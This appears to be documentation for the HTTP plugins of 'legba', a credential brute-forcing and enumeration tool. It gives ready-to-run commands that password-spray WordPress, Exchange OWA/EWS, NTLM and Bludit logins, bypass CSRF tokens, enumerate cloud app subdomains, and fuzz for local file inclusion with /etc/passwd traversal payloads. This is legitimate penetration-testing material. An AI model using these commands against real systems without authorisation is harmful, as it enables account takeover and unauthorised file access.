A set of plugins supporting http basic authentication, NTLMv1, NTLMv2, multipart form requests, standard HTTP requests, CSRF token grabbing and HTTP pages enumeration.

| Name | Description |
| ---- | ----------- |
| http       | HTTP request. |
| http.basic | HTTP basic authentication. |
| http.enum  | HTTP pages enumeration. |
| http.form  | HTTP multipart form request. |
| http.ntlm1 | NTLMv1 authentication over HTTP. |
| http.ntlm2 | NTLMv2 authentication over HTTP. |
| http.vhost | HTTP virtual host enumeration. |

## Options

| Name | Description |
| ---- | ----------- | 
| `--http-success <EXPRESSION>` | Boolean expression to evaluate in order to recognize a succesful attempt [default: "status == 200"] |
| `--http-ua <HTTP_UA>` | Set a fixed User-Agent (random by default if not set) |
| `--http-follow-redirects` | Follow HTTP redirects |
| `--http-method <HTTP_METHOD>` | Request method for HTTP based plugins [default: `GET`] |
| `--http-headers <HTTP_HEADERS>...` | Request headers for HTTP based plugins |
| `--http-csrf-page <HTTP_CSRF_PAGE>` | For each request grab a CSRF token from this page |
| `--http-csrf-regexp <HTTP_CSRF_REGEXP>` | Regular expression to use to grab the CSRF token name and value [default: `"<input type=\"hidden\" name=\"(token)\" value=\"([^\"]+)\""`] |
| `--http-payload <HTTP_PAYLOAD>` | Request payload (query string, post body or form data) for HTTP based plugins |
| `--http-enum-ext <HTTP_ENUM_EXT>` | File extension for HTTP enumeration [default: `php`] |
| `--http-enum-ext-placeholder <HTTP_ENUM_EXT_PLACEHOLDER>` | File extension placeholder for HTTP enumeration wordlist [default: `%EXT%`] |
| `--http-ntlm-domain <HTTP_NTLM_DOMAIN>` | Domain for NTLM authentication over HTTP |
| `--http-ntlm-workstation <HTTP_NTLM_WORKSTATION>` | Workstation name for NTLM authentication over HTTP [default: `CLIENT`] |
| `--proxy <PROXY>` | Proxy URL |
| `--proxy-auth <PROXY_AUTH>` | Proxy authentication as username:password |

## Success Expression

The `--http-success` parameter accepts a boolean expression that is evaluated to determine if an HTTP response indicates a successful authentication/enumeration attempt. The expression has access to various response properties and supports multiple operators and functions.

### Available Variables

- **`status`** - HTTP response status code (e.g., 200, 302, 404)
- **`body`** - Response body content as a string
- **`size`** - Response body size in bytes
- **headers** - Any response header converted to lowercase with hyphens replaced by underscores (e.g., `X-Auth-Token` becomes `x_auth_token`)

### Supported Operations

#### Basic Comparisons
- `status == 200` - Check for specific status code
- `size > 1000` - Compare body size
- `set_cookie != ""` - Check if cookie is set
- `content_type == "application/json"` - Check header values

#### String Functions
- `contains(body, "success")` - Check if body contains text
- `contains(set_cookie, "session_id")` - Check if cookie contains text
- `str::regex_matches(body, "user[0-9]+")` - Match body against regex pattern
- `str::regex_matches(body, "(?i)success")` - Case-insensitive regex match

#### Logical Operators
- `&&` - Logical AND
- `||` - Logical OR  
- `!` - Logical NOT
- Parentheses for grouping: `(status == 200 || status == 201) && contains(body, "ok")`

For a list of all the operators and builtin functions [refer to this documentation](https://docs.rs/evalexpr/latest/evalexpr/index.html).

### Expression Examples

```sh
# Simple status check
--http-success "status == 200"

# Redirect with cookie (common for successful login)
--http-success 'status == 302 && set_cookie != ""'

# Check for specific text in response
--http-success 'status == 200 && contains(body, "dashboard")'

# Exclude error messages
--http-success 'status == 200 && !contains(body, "invalid credentials")'

# Multiple acceptable status codes
--http-success "status == 200 || status == 201"

# Complex expression with regex
--http-success 'status == 200 && str::regex_matches(body, "\"token\":\\s*\"[a-z0-9]{32}\"")'

# Check response size
--http-success "status == 200 && size > 0 && size != 2045"

# Verify API response
--http-success 'status == 200 && content_type == "application/json" && contains(body, "\"authenticated\": true")'

# Check for username in response
--http-success 'status == 200 && contains(body, username)'

# Check for password in response
--http-success 'status == 200 && contains(body, password)'

# Check for single payload (for http.enum)
--http-success 'status == 200 && contains(body, payload)'
```

## Plugin Usage Examples

### Basic Authentication

HTTP Basic Authentication

```sh
legba http.basic \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/
```

### NTLM Authentication

HTTP Request with NTLMv1 Authentication:

```sh
legba http.ntlm1 \
    --http-ntlm-domain example.org \
    --http-ntlm-workstation client \
    --username admin \
    --password wordlists/passwords.txt \
    --target https://localhost:8888/
```

HTTP Request with NTLMv2 Authentication:

```sh
legba http.ntlm2 \
    --http-ntlm-domain example.org \
    --http-ntlm-workstation client \
    --username admin \
    --password wordlists/passwords.txt \
    --target https://localhost:8888/
```

Targeting an example Microsoft Exchange server via NTLMv2:

```sh
legba http.ntlm2 \
    --http-ntlm-domain LEGBA \
    --username jeff \
    --password wordlists/passwords.txt \
    -T "https://exchange-server/ews" \
    --http-success "status == 200 || status == 500"
```

### Enumeration

Basic HTTP directories and pages enumeration:
 
```sh
legba http.enum \
    --payloads data/pages.txt \
    --target http://localhost:8888/ \
    --http-enum-ext php # php is the default value for file extensions
```

Enumerate Microsoft Azure management URLs:

```sh
legba http.enum \
    --payloads data/names.txt \
    --target 'https://{PAYLOAD}.scm.azurewebsites.net'
```

Enumerate Firebase apps URLs:

```sh
legba http.enum \
    --payloads data/names.txt \
    --target 'https://{PAYLOAD}.firebaseapp.com'
```

Enumerate AWS apps URLs:

```sh
legba http.enum \
    --payloads data/names.txt \
    --target 'https://{PAYLOAD}.awsapps.com'
```

Wordpress plugin discovery using interpolation syntax:
 
```sh
legba http.enum \
    --payloads data/wordpress-plugins.txt \
    --target http://localhost:8888/wp-content/plugins/{PAYLOAD}/readme.txt
```

LFI vulnerability fuzzing:

```sh
legba http.enum \
    --payloads data/lfi.txt \
    --target http://localhost:8888/ \
    --http-success 'contains(body, "root:")'
```

The `data/lfi.txt` would be something like:

```
?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
file?filename=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
...
... and so on ...
...
```

### Misc HTTP Requests

HTTP Post Request (Wordpress wp-login.php page):

```sh
legba http \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/wp-login.php \
    --http-method POST \
    --http-success "status == 302" \ # wordpress redirects on successful login
    --http-payload 'log={USERNAME}&pwd={PASSWORD}'
```

HTTP Post Request (Wordpress xmlrpc.php)

```sh
legba http \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/xmlrpc.php \
    --http-method POST \
    --http-payload '<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{USERNAME}</string></value></param><param><value><string>{PASSWORD}</string></value></param></params></methodCall>' \
    --http-success 'contains(body, "isAdmin")' # what string successful response will contain
```

Or using the @ syntax to load the payload from a file:

```sh
legba http \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/xmlrpc.php \
    --http-method POST \
    --http-payload @xmlrpc-payload.xml \
    --http-success 'contains(body, "isAdmin")'
```

HTTP Post Request with CSRF Token grabbing:

```sh
legba http \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/ \
    --http-csrf-page http://localhost:8888/ \ # where to grab the CSRF token from
    --http-csrf-regexp '<input type="hidden" name="([^\"]+)" value="([^\"]+)"' \ # regular expression to extract it
    --http-method POST \
    --http-payload 'user={USERNAME}&pass={PASSWORD}'
```

Practical example for the Bludit CMS:

```sh
legba http \
    --username admin \
    --password /path/to/your/wordlist.txt \
    -T http://10.10.10.191/admin/ \
    --http-csrf-page http://10.10.10.191/admin/ \
    --http-csrf-regexp 'id="jstokenCSRF" name="([^\"]+)" value="([^\"]+)"' \
    --http-method POST \
    --http-payload 'username={USERNAME}&password={PASSWORD}' \
    --http-success 'status == 301'
```

Targeting an example Microsoft Exchange server via OWA:

```sh
legba http \
    --target "https://exchange-server/owa/auth.owa" \
    --username "LEGBA\jeff" \
    --password wordlists/passwords.txt \
    --http-method POST \
    --http-payload 'destination=https://exchange-server/&flags=4&username={USERNAME}&password={PASSWORD}' \
    --http-success 'status == 302 && set_cookie != ""'
```